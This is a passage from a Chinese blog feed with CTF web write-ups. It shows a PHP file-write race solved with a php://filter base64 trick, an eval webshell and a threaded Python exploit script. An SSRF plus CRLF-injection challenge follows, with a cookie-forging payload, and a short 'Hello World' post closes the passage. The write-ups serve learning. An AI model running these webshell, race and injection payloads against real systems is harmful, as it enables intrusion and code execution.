<span class="keyword">foreach</span> (<span class="variable">$dirs</span> <span class="keyword">as</span> <span class="variable">$dir</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$dir</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$dir</span> != <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$sonDir</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$dir</span>;</span><br><span class="line">                    <span class="keyword">if</span> (is_dir(<span class="variable">$sonDir</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                        deleteDir(<span class="variable">$sonDir</span>);</span><br><span class="line"></span><br><span class="line">                        @rmdir(<span class="variable">$sonDir</span>);</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (<span class="variable">$sonDir</span> !== <span class="string">&#x27;./index.php&#x27;</span></span><br><span class="line">                            &amp;&amp; <span class="variable">$sonDir</span> !== <span class="string">&#x27;./flag.php&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        @unlink(<span class="variable">$sonDir</span>);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @rmdir(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$devil</span> = <span class="string">&#x27;&lt;?php exit;?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$goods</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;train&#x27;</span>], <span class="variable">$devil</span> . <span class="variable">$goods</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    deleteDir(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>先补充一下知识点，解读一下函数的意思，大致都是文件操作相关的函数：</p><ol><li>is_dir ( $path ) 判断当前路径是否为目录 ,返回布尔。</li><li>rmdir 删除目录，删除前必须先删除目录下所有文件和目录。</li><li>file_put_contents 将一个字符串写入文件</li><li>scandir — 列出指定路径中的文件和目录，返回一个 array，包含有 <code>directory</code> 中的文件和目录。directory，要被浏览的目录。</li><li><code>foreach</code> 语法结构提供了遍历数组的简单方式。<code>foreach</code> 仅能够应用于数组和对象。</li><li>unlink — 删除文件</li><li>file_get_contents(‘./目标文本文件’); <em>//取得文本文件的内容（之前序列化过的字符串）</em></li></ol><p>首先，要读出flag，要先绕过exit这段php代码，由于是<strong>写入文件中的，所以可以利用伪协议</strong>，<strong>将输入的字符串进行base64解码，当我们输入的字符会使解码出现乱码</strong>，<strong>那么exit就不会出现并执行</strong>。再考虑后面传入good的内容，上传一句话木马用来输入命令打开flag.php，即<?php eval($_POST["cmd"]);?>,执行POST来的cmd参数语句，利用这个功能可以查看甚至修改你的数据库数据和文件。</p><p>总体就是将一句话（用来访问flag文件）写入一个文件，在脚本删掉他之前不断访问它！</p><p>之后的代码就是有个sleep(1),结合后面的删除文件函数，可能会删除我们写入的文件，所以我们要做的就是比响应还要快的读到文件，所以我们要抢到在它删除之前访问文件，就如我们打开文件的时候去删除它，会提示文件文件已打开一样，这样从而防止文件被删除，也就是<strong>条件竞争</strong>，然后开始用脚本多线程攻击，这个脚本是找的改的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line">sessid = <span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传一句话</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">global</span> event</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#上传的文件,瞎塞点数据就好了</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="comment">#data就是笔记中说的需要同时POST上传的内容,作为拼接成的键名的一部分,把其值替换为一句话</span></span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://81.68.109.40:30007/&#x27;</span>, data=&#123;<span class="string">&#x27;goods&#x27;</span>: <span class="string">&#x27;aPD9waHAgZXZhbCgkX1BPU1RbImNtZCJdKTs/Pg==&#x27;</span>,<span class="string">&quot;train&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=ez.php&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">while</span> resp.status_code==<span class="number">429</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            resp = session.post( <span class="string">&#x27;http://81.68.109.40:30007/&#x27;</span>, data=&#123;<span class="string">&#x27;goods&#x27;</span>: <span class="string">&#x27;aPD9waHAgZXZhbCgkX1BPU1RbImNtZCJdKTs/Pg==&#x27;</span>,<span class="string">&quot;train&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=ez.php&quot;</span>&#125;)</span><br><span class="line"><span class="comment">#访问一句话</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">global</span> event</span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    <span class="keyword">global</span> sessid</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://81.68.109.40:30007/ez.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">while</span> resp.status_code==<span class="number">429</span>:</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            resp = session.post(<span class="string">&#x27;http://81.68.109.40:30007/ez.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code!=<span class="number">404</span>:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.<span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="comment">#这个多线程个人决定有点问题,拿到flag后根本停不下来</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后拿到flag：</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211014215546856.png" alt="image-20211014215546856"></p><h2 id="12-🤯Hard-To-be-Admin-Again-and-Again-and-Again"><a href="#12-🤯Hard-To-be-Admin-Again-and-Again-and-Again" class="headerlink" title="12.[🤯Hard]To_be_Admin_Again_and_Again_and_Again"></a>12.[🤯Hard]To_be_Admin_Again_and_Again_and_Again</h2><p>打开题目是一个跳转网页的服务，考虑漏洞，首先想到SSRF，因为SSRF适用于在网页跳转时进行攻击，所以接下来第一步就是想着找到靶机的地址，跳转到靶机，经过多次尝试，构造payload为：request?url=<strong>file:///proc/net/arp</strong>，这里讲解一下这个参数，可以<strong>显示当前路由器或者靶机上client的IP，name等相关信息。0x0是找不到这台主机，0x2是这台主机还在线。</strong></p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021151745084.png" alt="image-20211021151745084"></p><p>找到一条地址，就试着传进去看到：Try/source?,接着构造payload为：request?url=<a href="http://172.16.233.233:5000/source?%E5%BE%97%E5%88%B0%EF%BC%9A">http://172.16.233.233:5000/source?得到：</a></p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021152749182.png" alt="image-20211021152749182"></p><p>通过读代码可知，要访问admin页面，同时只有验证cookie里的admin值为c 的值才会显示flag！注意这里<strong>改的是我们访问靶机的cookie，并且要求在跳转时cookie会被带过去。</strong>找了很多知识点，知道找到了<strong>CRLF注入</strong>:</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021162846670.png" alt="image-20211021162846670"></p><p>本题考察的是HTTP状态行注入恶意首部字段，例如构造payload为：url = “<a href="http://47.101.57.72:4000/?a=1">http://47.101.57.72:4000?a=1</a> HTTP/1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID=whoami”</p><p>响应之后为：<img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105150508197.png" alt="image-20211105150508197"></p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105150525425.png" alt="image-20211105150525425"></p><p>然后构造payload为：request?url=<a href="http://172.16.233.233:5000/admin">http://172.16.233.233:5000/admin</a>? HTTP/1.1%0D%0ACookie:admin=6a9e47ca067b07047e3d571512ec4f82%0D%0A%0D%0A/,即可得到flag:</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021162506147.png" alt="image-20211021162506147"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CNSS-Recruit-2021——web-wp&quot;&gt;&lt;a href=&quot;#CNSS-Recruit-2021——web-wp&quot; class=&quot;headerlink&quot; title=&quot;CNSS Recruit 2021——web_wp&quot;&gt;&lt;/a&gt;CNSS Recrui</summary>
      
    
    
    
    <category term="Study" scheme="http://example.com/categories/Study/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/11/17/hello-world/"/>
    <id>http://example.com/2021/11/17/hello-world/</id>
    <published>2021-11-17T02:26:12.000Z</published>
    <updated>2021-11-17T07:32:11.187Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习!</p><p>大概更新的学习内容会有CTF，python，Java的相关知识，期待您的来访~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h2&gt;&lt;p&gt;hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习!&lt;/p&gt;
&lt;p&gt;大概更新的学习内容会有CTF，python</summary>
      
    
    
    
    <category term="Diary" scheme="http://example.com/categories/Diary/"/>
    
    
    <category term="Day1" scheme="http://example.com/tags/Day1/"/>
    
  </entry>
  
</feed>
